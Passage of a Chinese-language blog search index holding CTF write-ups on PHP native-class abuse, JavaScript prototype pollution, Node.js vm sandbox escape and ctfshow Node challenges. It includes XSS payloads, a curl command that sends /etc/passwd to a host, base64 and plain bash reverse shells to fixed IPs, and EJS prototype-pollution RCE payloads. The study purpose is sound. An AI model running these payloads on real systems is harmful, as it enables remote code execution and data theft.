<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>从一道ctf题看php原生类</title>
      <link href="/2022/02/25/%E4%BB%8E%E4%B8%80%E9%81%93ctf%E9%A2%98%E7%9C%8Bphp%E5%8E%9F%E7%94%9F%E7%B1%BB/"/>
      <url>/2022/02/25/%E4%BB%8E%E4%B8%80%E9%81%93ctf%E9%A2%98%E7%9C%8Bphp%E5%8E%9F%E7%94%9F%E7%B1%BB/</url>
      
        <content type="html"><![CDATA[<p>这是ctfshow的一道比赛题</p><p>先来看看源码</p><pre class="language-none"><code class="language-none">&lt;?phperror_reporting(0);if(isset($_GET[&#39;source&#39;]))&#123;    highlight_file(__FILE__);    echo &quot;\$flag_filename &#x3D; &#39;flag&#39;.md5(???).&#39;php&#39;;&quot;;    die();&#125;if(isset($_POST[&#39;a&#39;]) &amp;&amp; isset($_POST[&#39;b&#39;]) &amp;&amp; isset($_POST[&#39;c&#39;]))&#123;    $c &#x3D; $_POST[&#39;c&#39;];    $count[++$c] &#x3D; 1;    if($count[] &#x3D; 1) &#123;        $count[++$c] &#x3D; 1;        print_r($count);        die();    &#125;else&#123;        $a &#x3D; $_POST[&#39;a&#39;];        $b &#x3D; $_POST[&#39;b&#39;];        echo new $a($b);    &#125;&#125;?&gt;$flag_filename &#x3D; &#39;flag&#39;.md5(???).&#39;php&#39;;</code></pre><p>绕过第二个if判断是利用了数组溢出的原理</p><p>然后进入else语句</p><p>一般看到echo new $a($b)这种形式，就需要考虑利用php的原生类来遍历目录以及读取文件</p><h2 id="报错类"><a href="#报错类" class="headerlink" title="报错类"></a>报错类</h2><h3 id="Error"><a href="#Error" class="headerlink" title="Error"></a>Error</h3><p>在PHP7版本中，因为Error中带有<code>__toString</code>方法，该方法会将传入给<code>__toString</code>的参数原封不动的输出到浏览器。在这么一个过程中可能会产生XSS。</p><p><img src="https://gitee.com/E_theNULL/picture/raw/master/img/php%E5%8E%9F%E7%94%9F%E7%B1%BB/image-20220226142059060.png"></p><pre class="language-none"><code class="language-none">a&#x3D;Error&amp;b&#x3D;&lt;script&gt;alert(1);&lt;&#x2F;script&gt;&amp;c&#x3D;9223372036854775806</code></pre><h3 id="Exception"><a href="#Exception" class="headerlink" title="Exception"></a>Exception</h3><p>与Error类似，Exception同样有<code>__toString</code>方法，因此测试代码和上方一样，传入以下payload，同样可以XSS。</p><p><img src="https://gitee.com/E_theNULL/picture/raw/master/img/php%E5%8E%9F%E7%94%9F%E7%B1%BB/image-20220226173222714.png" alt="image-20220226173222714"></p><pre class="language-none"><code class="language-none">a&#x3D;Exception&amp;b&#x3D;&lt;script&gt;alert(1);&lt;&#x2F;script&gt;&amp;c&#x3D;9223372036854775806</code></pre><h2 id="遍历目录类"><a href="#遍历目录类" class="headerlink" title="遍历目录类"></a>遍历目录类</h2><h3 id="DirectoryIterator"><a href="#DirectoryIterator" class="headerlink" title="DirectoryIterator"></a>DirectoryIterator</h3><p>DirectoryIterator类的<code>__construct</code>方法会构造一个迭代器，如果使用echo输出该迭代器，将会返回迭代器的第一项</p><p><img src="https://gitee.com/E_theNULL/picture/raw/master/img/php%E5%8E%9F%E7%94%9F%E7%B1%BB/image-20220226173809874.png" alt="image-20220226173809874"></p><p>返回了一个点，这个点代表这当前目录</p><p>如果要匹配其他文件，要利用glob协议</p><p><img src="https://gitee.com/E_theNULL/picture/raw/master/img/php%E5%8E%9F%E7%94%9F%E7%B1%BB/image-20220226174839331.png" alt="image-20220226174839331"></p><p>glob协议支持通配符，所以对于不知道文件名的文件可以利用通配符进行匹配</p><h3 id="FilesystemIterator"><a href="#FilesystemIterator" class="headerlink" title="FilesystemIterator"></a>FilesystemIterator</h3><p>与DirectoryIterator类似，但实际使用时发现有些不同</p><p><img src="https://gitee.com/E_theNULL/picture/raw/master/img/php%E5%8E%9F%E7%94%9F%E7%B1%BB/image-20220226175041268.png" alt="image-20220226175041268"></p><h3 id="GlobIterator"><a href="#GlobIterator" class="headerlink" title="GlobIterator"></a>GlobIterator</h3><p>无需加glob协议，因为这是自带的</p><p><img src="https://gitee.com/E_theNULL/picture/raw/master/img/php%E5%8E%9F%E7%94%9F%E7%B1%BB/image-20220226175140543.png" alt="image-20220226175140543"></p><h2 id="读取文件类"><a href="#读取文件类" class="headerlink" title="读取文件类"></a>读取文件类</h2><h3 id="SplFileObject"><a href="#SplFileObject" class="headerlink" title="SplFileObject"></a>SplFileObject</h3><blockquote><p>SplFileObject类为文件提供了一个面向对象接口</p></blockquote><p>也就是说我们可以利用这个来读取文件，例如</p><pre class="language-none"><code class="language-none">a&#x3D;SplFileObject&amp;b&#x3D;flag.php</code></pre><p>但是由于这个类返回的是迭代器，所以不能完整的读出文件，所以就要利用php://filter来将文件内容以全部输出</p><p><img src="https://gitee.com/E_theNULL/picture/raw/master/img/php%E5%8E%9F%E7%94%9F%E7%B1%BB/image-20220226181714890.png" alt="image-20220226181714890"></p><h2 id="回到这道题"><a href="#回到这道题" class="headerlink" title="回到这道题"></a>回到这道题</h2><p>我们可以利用</p><p>FilesystemIterator、DirectoryIterator或GlobIterator找到flag所在的目录，再用SplFileObject读出文件内容</p><p>但是这道题中flag文件并不叫flag.php而是flag.md5(???).php，所以我们要用通配符找到真正的flag文件，</p><p><img src="https://gitee.com/E_theNULL/picture/raw/master/img/php%E5%8E%9F%E7%94%9F%E7%B1%BB/image-20220226184433903.png" alt="image-20220226184433903"></p><p>在通配符中，？代表一个字符，但是必须存在，而*表示存在任意个字符，但是也包括零个，所以因为迭代器的性质，只加*就只能匹配到flag.php</p><p>但是如果我们用FilesystemIterator，我们可以直接加路径看到这个flag文件，不太理解为什么</p><p><img src="https://gitee.com/E_theNULL/picture/raw/master/img/php%E5%8E%9F%E7%94%9F%E7%B1%BB/image-20220226184809317.png" alt="image-20220226184809317"></p><p>接下来就是用SplFileObject读出来就然后base64解个码就行</p><p><img src="https://gitee.com/E_theNULL/picture/raw/master/img/php%E5%8E%9F%E7%94%9F%E7%B1%BB/image-20220226185100750.png" alt="image-20220226185100750"></p><h2 id="原生类获取注释"><a href="#原生类获取注释" class="headerlink" title="原生类获取注释"></a>原生类获取注释</h2><p>看见这个想起了去年国赛我唯一出了的一道题</p><pre class="language-none"><code class="language-none">&lt;?phphighlight_file(__file__);class User&#123;    private static $c &#x3D; 0;    function a()    &#123;        return ++self::$c;    &#125;    function b()    &#123;        return ++self::$c;    &#125;    function c()    &#123;        return ++self::$c;    &#125;    function d()    &#123;        return ++self::$c;    &#125;        &#x2F;**         * flag         *&#x2F;    function e()    &#123;        return ++self::$c;    &#125;    function f()    &#123;        return ++self::$c;    &#125;    function g()    &#123;        return ++self::$c;    &#125;    function h()    &#123;        return ++self::$c;    &#125;    function i()    &#123;        return ++self::$c;    &#125;    function j()    &#123;        return ++self::$c;    &#125;    function k()    &#123;        return ++self::$c;    &#125;    function l()    &#123;        return ++self::$c;    &#125;    function m()    &#123;        return ++self::$c;    &#125;    function n()    &#123;        return ++self::$c;    &#125;    function o()    &#123;        return ++self::$c;    &#125;    function p()    &#123;        return ++self::$c;    &#125;    function q()    &#123;        return ++self::$c;    &#125;    function r()    &#123;        return ++self::$c;    &#125;    function s()    &#123;        return ++self::$c;    &#125;    function t()    &#123;        return ++self::$c;    &#125;&#125;$rc&#x3D;$_GET[&quot;rc&quot;];$rb&#x3D;$_GET[&quot;rb&quot;];$ra&#x3D;$_GET[&quot;ra&quot;];$rd&#x3D;$_GET[&quot;rd&quot;];$method&#x3D; new $rc($ra, $rb);var_dump($method-&gt;$rd());</code></pre><p>flag在注释里但并不会被显示出来，但是我们可以利用通过反射 ReflectionMethod 类来获取类方法的相关信息</p><pre class="language-text" data-language="text"><code class="language-text">?rc&#x3D;ReflectionMethod&amp;ra&#x3D;User&amp;rb&#x3D;e&amp;rd&#x3D;getDocComment</code></pre><p><img src="https://gitee.com/E_theNULL/picture/raw/master/img/php%E5%8E%9F%E7%94%9F%E7%B1%BB/image-20220226193319167.png" alt="image-20220226193319167"></p>]]></content>
      
      
      
        <tags>
            
            <tag> web </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>js漏洞</title>
      <link href="/2022/02/21/js%E6%BC%8F%E6%B4%9E/"/>
      <url>/2022/02/21/js%E6%BC%8F%E6%B4%9E/</url>
      
        <content type="html"><![CDATA[<h1 id="原型链污染"><a href="#原型链污染" class="headerlink" title="原型链污染"></a>原型链污染</h1><h2 id="深入了解JavaScript"><a href="#深入了解JavaScript" class="headerlink" title="深入了解JavaScript"></a>深入了解JavaScript</h2><p>在JavaScript中，一切皆对象</p><p>当我们创建一个js对象如</p><pre class="language-none"><code class="language-none">var a &#x3D; &#123;&#125;;</code></pre><p>它会拥有一些自带的属性，如</p><p><img src="https://gitee.com/E_theNULL/picture/raw/master/img/js/image-20220221163610282.png" alt="image-20220221163610282"></p><p>JavaScript中，我们如果要定义一个类，需要以定义“构造函数”的方式来定义：</p><p><img src="https://gitee.com/E_theNULL/picture/raw/master/img/js/image-20220221163750576.png" alt="image-20220221163750576"></p><p>这里test()函数的内容其实就是test类的构造函数</p><p>而<strong>constructor</strong>这个属性就是用于查看对象的构造函数</p><p><img src="https://gitee.com/E_theNULL/picture/raw/master/img/js/image-20220221164147637.png" alt="image-20220221164147637"></p><p>接下来我们要知道<strong>prototype</strong>和**<em>_proto</em>_**又是什么</p><p><img src="https://gitee.com/E_theNULL/picture/raw/master/img/js/787416-20160323103557261-114570044.png" alt="img"></p><p><img src="https://gitee.com/E_theNULL/picture/raw/master/img/js/787416-20160323103622089-1134417169.png" alt="img"></p><p>从类的角度讲，<code>prototype</code>是其一个属性，所有类实例化的对象，都将拥有这个属性中的所有内容，包括变量和方法。但是类所实例化的对象并不能通过prototype访问原型，所以才有<code>__proto__</code>出现，且一个对象的<strong>proto</strong>属性，指向这个对象所在的类的prototype属性。</p><p>这个特性被用于实现JavaScript中的继承机制，为什么我们定义的a有 toString() 属性？这正是继承机制的作用。</p><p>对于a而言有个__proto__属性指向window.Object.prototype</p><p>这样你在调用a.toString() 的时候，a本身没有 toString，就去 a.<em>_<em>proro</em></em>_ 上面去找 toString。</p><p>所以你调用 a.toString 的时候，实际上调用的是 window.Object.prototype.toString</p><p><img src="https://gitee.com/E_theNULL/picture/raw/master/img/js/image-20220221172804302.png" alt="image-20220221172804302"></p><p>对于p神的例子我的理解是对Foo类的父类添加一个show函数，同样是利用继承来实现存在foo.show()</p><p><img src="https://gitee.com/E_theNULL/picture/raw/master/img/js/image-20220221173043928.png" alt="image-20220221173043928"></p><p>总结一下</p><ol><li><code>prototype</code>是一个类的属性，所有类对象在实例化的时候将会拥有<code>prototype</code>中的属性和方法</li><li>一个对象的<code>__proto__</code>属性，指向这个对象所在的类的<code>prototype</code>属性</li><li>类在运行程序运行时是可以修改的</li></ol><h2 id="JavaScript的原型与原型链"><a href="#JavaScript的原型与原型链" class="headerlink" title="JavaScript的原型与原型链"></a>JavaScript的原型与原型链</h2><p>这种继承机制使得JavaScript中有原型和原型链的存在</p><p><strong>原型</strong></p><p>①所有<code>引用类型</code>都有一个<code>__proto__(隐式原型)</code>属性，属性值是一个普通的对象<br>②所有<code>函数</code>都有一个<code>prototype(原型)</code>属性，属性值是一个普通的对象<br>③所有<code>引用类型的__proto__</code>属性<code>指向</code>它<code>构造函数的prototype</code>**</p><p><strong>原型链</strong></p><p>当访问一个对象的某个属性时，会先在这个对象本身属性上查找，如果没有找到，则会去它的__proto__隐式原型上查找，即它的构造函数的prototype，如果还没有找到就会再在构造函数的prototype的__proto__中查找，这样一层一层向上查找就会形成一个链式结构，我们称为原型链。</p><p><img src="https://gitee.com/E_theNULL/picture/raw/master/img/js/787416-20160322110905589-2039017350.png" alt="什么是原型链？"></p><p>举例：</p><p>若有代码</p><pre class="language-none"><code class="language-none">function Parent(month)&#123;    this.month &#x3D; month;&#125;var child &#x3D; new Parent(&#39;Ann&#39;);console.log(child.month); &#x2F;&#x2F; Annconsole.log(child.father); &#x2F;&#x2F; undefined</code></pre><p>则在child中查找某个属性时会</p><p><img src="https://gitee.com/E_theNULL/picture/raw/master/img/js/20180620134143385" alt="这里写图片描述"></p><h2 id="什么是原型链污染"><a href="#什么是原型链污染" class="headerlink" title="什么是原型链污染"></a>什么是原型链污染</h2><p>Object.prototype是一个对象，用于表示Object的原型对象。几乎所有的JavaScript对象都是Object的实例，其原型链上最后一个就是指向Object.prototype。</p><p>所以我们可以通过修改Object.prototype来实现对变量的修改</p><p><img src="https://gitee.com/E_theNULL/picture/raw/master/img/js/image-20220221182419388.png" alt="image-20220221182419388"></p><p>可以看到我们将a.<em>_proto</em>_.bar 设置为2</p><p>新定义的变量也有了bar属性，且为2</p><p>那么，在一个应用中，如果攻击者控制并修改了一个对象的原型，那么将可以影响所有和这个对象来自同一个类、父祖类的对象。这种攻击方式就是<strong>原型链污染</strong>。</p><h2 id="原型链污染的利用"><a href="#原型链污染的利用" class="headerlink" title="原型链污染的利用"></a>原型链污染的利用</h2><p>当存在控制数组（对象）的“键名”的操作时，我们就可以设置__proto__的值，从而实现原型链污染</p><h3 id="最显然的情况"><a href="#最显然的情况" class="headerlink" title="最显然的情况"></a>最显然的情况</h3><pre class="language-none"><code class="language-none">obj[a][b] &#x3D; valueobj[a][b][c] &#x3D; value</code></pre><p>如果控制了a,b,c及value就可以进行原型链污染的攻击,</p><p>可以控制<code>a=__proto__</code></p><h3 id="利用特殊的api"><a href="#利用特殊的api" class="headerlink" title="利用特殊的api"></a>利用特殊的api</h3><ul><li>对象merge</li><li>对象clone（其实内核就是将待操作的对象merge到一个空对象中）</li></ul><p>例如</p><pre class="language-none"><code class="language-none">function merge(target, source) &#123;console.log(target[key], source[key])    for (let key in source) &#123;        if (key in source &amp;&amp; key in target) &#123;            merge(target[key], source[key])        &#125; else &#123;            target[key] &#x3D; source[key]        &#125;    &#125;&#125;</code></pre><p>这时如果key是__proto__不就可以直接修改其原型了吗</p><p><img src="https://gitee.com/E_theNULL/picture/raw/master/img/js/image-20220221200009010.png" alt="image-20220221200009010"></p><p>但是这里并没有成功，这是因为，我们用JavaScript创建o2的过程（<code>let o2 = &#123;a: 1, &quot;__proto__&quot;: &#123;b: 2&#125;&#125;</code>）中，<code>__proto__</code>已经代表o2的原型了，此时遍历o2的所有键名，你拿到的是<code>[a, b]</code>，<code>__proto__</code>并不是一个key，自然也不会修改Object的原型。</p><p>只有经过JSON.parse解析,才能让<code>__proto__</code>代表了一个key</p><p><img src="https://gitee.com/E_theNULL/picture/raw/master/img/js/image-20220221200323952.png" alt="image-20220221200323952"></p><p>成功污染</p><p>参考文章：</p><p><a href="https://www.leavesongs.com/PENETRATION/javascript-prototype-pollution-attack.html">深入理解 JavaScript Prototype 污染攻击 | 离别歌 (leavesongs.com)</a></p><p><a href="https://blog.csdn.net/xiaoermingn/article/details/80745117?ops_request_misc=%7B%22request_id%22:%22164543411816780274140815%22,%22scm%22:%2220140713.130102334.pc_all.%22%7D&request_id=164543411816780274140815&biz_id=0&utm_medium=distribute.pc_search_result.none-task-blog-2~all~first_rank_ecpm_v1~rank_v31_ecpm-1-80745117.pc_search_result_cache&utm_term=%E5%8E%9F%E5%9E%8B%E9%93%BE&spm=1018.2226.3001.4187">【原型和原型链】什么是原型和原型链_沉迷学习 日渐消瘦-CSDN博客_原型链</a></p><p><a href="https://blog.csdn.net/weixin_45551083/article/details/109589386?utm_medium=distribute.pc_relevant.none-task-blog-2~default~baidujs_title~default-1.pc_relevant_aa&spm=1001.2101.3001.4242.2&utm_relevant_index=3">原型链污染漏洞(一)_lonmar的博客-CSDN博客</a></p><p><a href="https://www.jianshu.com/p/6e623e9debe3">从杭电hgame-week4学原型链污染 - 简书 (jianshu.com)</a></p><p><a href="https://www.cnblogs.com/shuiyi/p/5305435.html">三张图搞懂JavaScript的原型对象与原型链 - 水乙 - 博客园 (cnblogs.com)</a></p><p><a href="https://blog.csdn.net/a3320315/article/details/102883325">JavaScript Prototype污染攻击（CTF 例题分析）_a3320315的博客-CSDN博客</a></p><h1 id="node-js-沙盒逃逸"><a href="#node-js-沙盒逃逸" class="headerlink" title="node.js 沙盒逃逸"></a>node.js 沙盒逃逸</h1><h2 id="背景"><a href="#背景" class="headerlink" title="背景"></a>背景</h2><p>在nodejs当中了，eval始终存在着一定的问题，能够出乎意料的执行系统命令。</p><pre class="language-none"><code class="language-none">对于存在利用可能性的eval函数，可以使用chile_process.exec来间接调用&#x2F;bash.sh。它是一个bash解释器，可以执行系统命令。在eval函数的参数中可以构造require(&#39;child_process&#39;).exec(&#39;&#39;);来进行调用。like：读取文件：require(&#39;child_process&#39;).exec(&#39;curl -F &quot;x&#x3D;&#96;cat &#x2F;etc&#x2F;passwd&#96;&quot; http:&#x2F;&#x2F;vps&#39;);;   反弹shell：  q&#x3D;require(&#39;child_process&#39;).exec(&#39;echo YmFzaCAtaSAmZ3Q7JiAvZGV2L3RjcC8xOTIuMTY4LjExNC4xLzQ0NDQgMCZndDsmMQ&#x3D;&#x3D;|base64 -d|bash&#39;);  即bash -i &gt;&amp; &#x2F;dev&#x2F;tcp&#x2F;192.168.114.1&#x2F;4444 0&gt;&amp;1  </code></pre><p>类eval函数：</p><pre class="language-scss" data-language="scss"><code class="language-scss">setInteval(some_function, 2000)setTimeout(some_function, 2000);相当于匿名函数，即php当中create_function。</code></pre><p>eval/Function 算是动态执行 JS，但无法屏蔽当前执行环境的上下文，但 <a href="https://so.csdn.net/so/search?q=node&spm=1001.2101.3001.7020">node</a>.js 里提供了 vm 模块，相当于一个虚拟机，可以让你在执行代码时候隔离当前的执行环境，避免被恶意代码攻击。</p><p><img src="https://gitee.com/E_theNULL/picture/raw/master/img/js/image-20220221225320251.png" alt="image-20220221225320251"></p><p>在这段代码中，我们明明定义了y=2但仍然显示y不存在，这正是vm的作用</p><p>vm.runInContext()方法用于编译代码。它在contextifiedObject的上下文中运行代码，然后返回输出。此外，正在运行的代码无法访问本地范围，并且以前使用vm.createContext()方法将contextifiedObject对象上下文化。</p><p>也就是说我们将code这段要编译和运行的代码限制在了context域中，无法访问到超出上下文外的任何信息</p><p>这看起来是十分安全的方式</p><p>但在官网中有这样一段话<strong>vm 模块不是安全的机制。 不要使用它来运行不受信任的代码。</strong></p><p>也就是说，vm模块同样有被逃逸的风险</p><h2 id="VM逃逸"><a href="#VM逃逸" class="headerlink" title="VM逃逸"></a>VM逃逸</h2><pre class="language-none"><code class="language-none">const vm &#x3D; require(&quot;vm&quot;);const ctx &#x3D; &#123;&#125;;vm.runInNewContext(&#39;this.constructor.constructor(&quot;return process&quot;)().exit()&#39;,ctx);console.log(&quot;Never gets executed.&quot;);</code></pre><p>这段代码就是利用了原型链进行vm逃逸导致了程序的提前退出</p><p>创建vm环境时，首先要初始化一个对象 ctx，这个对象就是vm中脚本执行时的全局环境context，vm 脚本中全局 this 指向的就是这个对象。然后利用constructor来得到Function</p><p><img src="https://gitee.com/E_theNULL/picture/raw/master/img/js/image-20220221230610013.png" alt="image-20220221230610013"></p><p>函数构造器就像javascript给出的最高函数，它可以访问全局范围，因此它可以返回任何全局的东西。 函数构造器允许你从一个字符串中生成一个函数，从而执行任意代码。</p><p>上述代码在执行时，this 指向 ctx 并通过原型链的方式拿到沙盒外的 Funtion，vm 虚拟机环境中的代码逃逸，获得了主线程的 process 变量，并调用 process.exit()，造成主程序非正常退出。</p><p>所以我们能够用process变量来做更多的东西</p><p><img src="https://gitee.com/E_theNULL/picture/raw/master/img/js/image-20220221232104068.png" alt="image-20220221232104068"></p><p>或者这样</p><p><img src="https://gitee.com/E_theNULL/picture/raw/master/img/js/image-20220222145853148.png" alt="image-20220222145853148"></p><p>参考文章</p><p><a href="https://blog.csdn.net/cosmoslin/article/details/122166825">ctfshow—Node.js漏洞总结_cosmoslin的博客-CSDN博客</a></p><p><a href="http://www.javashuo.com/article/p-vwozjvrz-nu.html">node.js 沙盒逃逸分析 - JavaShuo</a></p><p><a href="https://www.cnblogs.com/ophxc/p/13663121.html">你终于回来了(。・∀・)ノ (cnblogs.com)</a></p><p><a href="https://xz.aliyun.com/t/7184#toc-10">Node.js 常见漏洞学习与总结 - 先知社区 (aliyun.com)</a></p><h1 id="CTFSHOW-nodejs部分"><a href="#CTFSHOW-nodejs部分" class="headerlink" title="CTFSHOW nodejs部分"></a>CTFSHOW nodejs部分</h1><h2 id="web334"><a href="#web334" class="headerlink" title="web334"></a>web334</h2><p><img src="https://gitee.com/E_theNULL/picture/raw/master/img/js/image-20220222154508492.png" alt="image-20220222154508492"></p><p><img src="https://gitee.com/E_theNULL/picture/raw/master/img/js/image-20220222154516338.png" alt="image-20220222154516338"></p><p>用户名不为CTFSHOW,还要经过大写转换后等于CTFSHOW,所以传入ctfshow密码为123456就行</p><p><img src="https://gitee.com/E_theNULL/picture/raw/master/img/js/image-20220222154618537.png" alt="image-20220222154618537"></p><h2 id="web335"><a href="#web335" class="headerlink" title="web335"></a>web335</h2><p>js的命令执行</p><p>可以使用chile_process.exec来间接调用/bash.sh。<br>它是一个bash解释器，可以执行系统命令。在eval函数的参数中可以构造require(&#39;child_process&#39;).exec(&#39;&#39;);来进行调用。</p><p>exec因为返回值的问题没法利用</p><p>所以这里可以用execSync</p><p>eval=require(&#39;child_process&#39;).execSync(&#39;ls&#39;)</p><p>eval=require(&#39;child_process&#39;).execSync(&#39;cat fl00g.txt&#39;)</p><p>或者spawnSync</p><p>eval=require(&#39;child_process&#39;).spawnSync(&#39;ls&#39;).stdout.toString()</p><p>eval=require(&#39;child_process&#39;).spawnSync(&#39;cat&#39;,[&#39;fl00g.txt&#39;]).stdout.toString()</p><p>还可以用global.process.mainModule.constructor._load替代require</p><p>eval=global.process.mainModule.constructor._load(&#39;child_process&#39;).execSync(&#39;ls&#39;)</p><h2 id="web336"><a href="#web336" class="headerlink" title="web336"></a>web336</h2><p>过滤了exec</p><p>但是可以用spawnSync</p><p>还可以利用fs模块文件操作</p><pre class="language-none"><code class="language-none">eval&#x3D;require(&#39;fs&#39;).readdirSync(&#39;.&#39;);eval&#x3D;require(&#39;fs&#39;).readFileSync(&#39;fl001g.txt&#39;);</code></pre><h2 id="web337"><a href="#web337" class="headerlink" title="web337"></a>web337</h2><p>数组绕过，但是不同于php的数组绕过</p><pre class="language-none"><code class="language-none">var express &#x3D; require(&#39;express&#39;);var router &#x3D; express.Router();var crypto &#x3D; require(&#39;crypto&#39;);function md5(s) &#123;  return crypto.createHash(&#39;md5&#39;)    .update(s)    .digest(&#39;hex&#39;);&#125;&#x2F;* GET home page. *&#x2F;router.get(&#39;&#x2F;&#39;, function(req, res, next) &#123;  res.type(&#39;html&#39;);  var flag&#x3D;&#39;xxxxxxx&#39;;  var a &#x3D; req.query.a;  var b &#x3D; req.query.b;  if(a &amp;&amp; b &amp;&amp; a.length&#x3D;&#x3D;&#x3D;b.length &amp;&amp; a!&#x3D;&#x3D;b &amp;&amp; md5(a+flag)&#x3D;&#x3D;&#x3D;md5(b+flag))&#123;  res.end(flag);  &#125;else&#123;  res.render(&#39;index&#39;,&#123; msg: &#39;tql&#39;&#125;);  &#125;  &#125;);module.exports &#x3D; router;</code></pre><p>传入a和b两个参数，长度相同但并不相等，同时拼接上flag的md5值相同</p><p>js有个很奇怪的特性</p><p>不能直接比较两个数组</p><p><img src="https://gitee.com/E_theNULL/picture/raw/master/img/js/image-20220222163045534.png" alt="image-20220222163045534"></p><p>而且拼接字符串时也有个特性</p><p><img src="https://gitee.com/E_theNULL/picture/raw/master/img/js/image-20220222163227744.png" alt="image-20220222163227744"></p><p>也就是说我们传入a[]=1&amp;b[]=1就能完美满足if判断得到flag</p><p>而如果我们传入的是非数字索引，那么他就会变成js中的对象</p><p>对象的拼接又有这种特性</p><p><img src="https://gitee.com/E_theNULL/picture/raw/master/img/js/image-20220222163556092.png" alt="image-20220222163556092"></p><p>所以我们传入a[x]=1&amp;b[x]=2同样可以满足if判断拿到flag</p><p><img src="https://gitee.com/E_theNULL/picture/raw/master/img/js/image-20220222163644062.png" alt="image-20220222163644062"></p><h2 id="web338"><a href="#web338" class="headerlink" title="web338"></a>web338</h2><p>common.js里有copy函数</p><p><img src="https://gitee.com/E_theNULL/picture/raw/master/img/js/image-20220222164222078.png" alt="image-20220222164222078"></p><p>猜测是原型链污染</p><p>看login.js</p><p><img src="https://gitee.com/E_theNULL/picture/raw/master/img/js/image-20220222164251260.png" alt="image-20220222164251260"></p><p>让secert的ctfshow属性等于36dboy</p><p>{&quot;<em>_proto</em>_&quot;:{&quot;ctfshow&quot;:&quot;36dboy&quot;}}</p><p>抓包之后改一下</p><p><img src="https://gitee.com/E_theNULL/picture/raw/master/img/js/image-20220222171254531.png" alt="image-20220222171254531"></p><h2 id="web339"><a href="#web339" class="headerlink" title="web339"></a>web339</h2><p><strong>非预期解：</strong>利用ejs模板rce漏洞</p><p>羽师傅的payload：</p><pre class="language-none"><code class="language-none">&#123;&quot;__proto__&quot;:&#123;&quot;outputFunctionName&quot;:&quot;_llama1;global.process.mainModule.require(&#39;child_process&#39;).exec(&#39;bash -c \&quot;bash -i &gt;&amp; &#x2F;dev&#x2F;tcp&#x2F;117.50.172.142&#x2F;8082 0&gt;&amp;1\&quot;&#39;);var _llama2&quot;&#125;&#125;</code></pre><p>反弹之前可以先关一下服务器的防火墙systemctl stop firewalld</p><p><img src="https://gitee.com/E_theNULL/picture/raw/master/img/js/image-20220222225454461.png" alt="image-20220222225454461"></p><p><img src="https://gitee.com/E_theNULL/picture/raw/master/img/js/image-20220222225546970.png" alt="image-20220222225546970"></p><p><a href="https://lonmar.cn/2021/02/22/%E5%87%A0%E4%B8%AAnode%E6%A8%A1%E6%9D%BF%E5%BC%95%E6%93%8E%E7%9A%84%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93%E5%88%86%E6%9E%90/">几个node模板引擎的原型链污染分析 | L0nm4r (lonmar.cn)</a></p><p><a href="https://blog.csdn.net/gental_z/article/details/107937110">CVE-2020-7699漏洞分析_gental_z的博客-CSDN博客</a></p><p><strong>预期解：</strong></p><p>登录部分</p><p><img src="https://gitee.com/E_theNULL/picture/raw/master/img/js/image-20220222170708843.png" alt="image-20220222170708843"></p><p>同样的copy函数</p><p><img src="https://gitee.com/E_theNULL/picture/raw/master/img/js/image-20220222170726147.png" alt="image-20220222170726147"></p><p>这里要求ctfshow=flag的内容，可我们并不知道flag</p><p>我们再看看api.js</p><p><img src="https://gitee.com/E_theNULL/picture/raw/master/img/js/image-20220222171015673.png" alt="image-20220222171015673"></p><p>如果我们可以利用原型链控制query的值，那么就能实现反弹shell的操作</p><p>但是这个是变量不是变量的属性，也能污染吗</p><p>答案是可以的</p><pre class="language-none"><code class="language-none">因为所有变量的最顶层都是object，当前环境没有，它会直接去寻找Object对象的属性当中是否有这个键值对是否存在</code></pre><p><img src="https://gitee.com/E_theNULL/picture/raw/master/img/js/image-20220222173051138.png" alt="image-20220222173051138"></p><p>所以我们可以构造payload</p><pre class="language-none"><code class="language-none">&#123;&quot;__proto__&quot;:&#123;&quot;query&quot;:&quot;return global.process.mainModule.constructor._load(&#39;child_process&#39;).exec(&#39;bash -c \&quot;bash -i &gt;&amp; &#x2F;dev&#x2F;tcp&#x2F;服务器IP&#x2F;监听端口 0&gt;&amp;1\&quot;&#39;)&quot;&#125;&#125;</code></pre><p>然后访问一下api页面触发query</p><p><img src="https://gitee.com/E_theNULL/picture/raw/master/img/js/image-20220222203151541.png" alt="image-20220222203151541"></p><h2 id="web340"><a href="#web340" class="headerlink" title="web340"></a>web340</h2><p>登录部分</p><p><img src="https://gitee.com/E_theNULL/picture/raw/master/img/js/image-20220222210758117.png" alt="image-20220222210758117"></p><p>copy函数：</p><p><img src="https://gitee.com/E_theNULL/picture/raw/master/img/js/image-20220222210810876.png" alt="image-20220222210810876"></p><p>这道题与web339利用点是相同的，我们同样要利用原型链污染来控制query的值达到反弹shell的目的。但是需要向上污染两级才能到达Object对象</p><p><img src="https://gitee.com/E_theNULL/picture/raw/master/img/js/image-20220222210739146.png" alt="image-20220222210739146"></p><p><img src="https://gitee.com/E_theNULL/picture/raw/master/img/js/image-20220222210925672.png" alt="image-20220222210925672"></p><p>所以我们的payload为</p><pre class="language-none"><code class="language-none">&#123;&quot;__proto__&quot;:&#123;&quot;__proto__&quot;:&#123;&quot;query&quot;:&quot;return global.process.mainModule.constructor._load(&#39;child_process&#39;).exec(&#39;bash -c \&quot;bash -i &gt;&amp; &#x2F;dev&#x2F;tcp&#x2F;服务器IP&#x2F;监听端口 0&gt;&amp;1\&quot;&#39;)&quot;&#125;&#125;&#125;</code></pre><p>同样传入之后访问一下api页面就行</p><h2 id="web341"><a href="#web341" class="headerlink" title="web341"></a>web341</h2><p>没有了api.js</p><p>所以只能用web339的那个非预期解，只是要跟web340一样向上污染两级</p><pre class="language-none"><code class="language-none">&#123;&quot;__proto__&quot;:&#123;&quot;__proto__&quot;:&#123;&quot;outputFunctionName&quot;:&quot;_llama1;global.process.mainModule.require(&#39;child_process&#39;).exec(&#39;bash -c \&quot;bash -i &gt;&amp; &#x2F;dev&#x2F;tcp&#x2F;117.50.172.142&#x2F;8082 0&gt;&amp;1\&quot;&#39;);var _llama2&quot;&#125;&#125;&#125;</code></pre><p><img src="https://gitee.com/E_theNULL/picture/raw/master/img/js/image-20220222225203273.png" alt="image-20220222225203273"></p><h2 id="web342-web343"><a href="#web342-web343" class="headerlink" title="web342-web343"></a>web342-web343</h2><p>同样是模板引擎的rce，不过不是之前的ejs，而是jade</p><p><a href="https://xz.aliyun.com/t/7025">再探 JavaScript 原型链污染到 RCE - 先知社区 (aliyun.com)</a></p><p><a 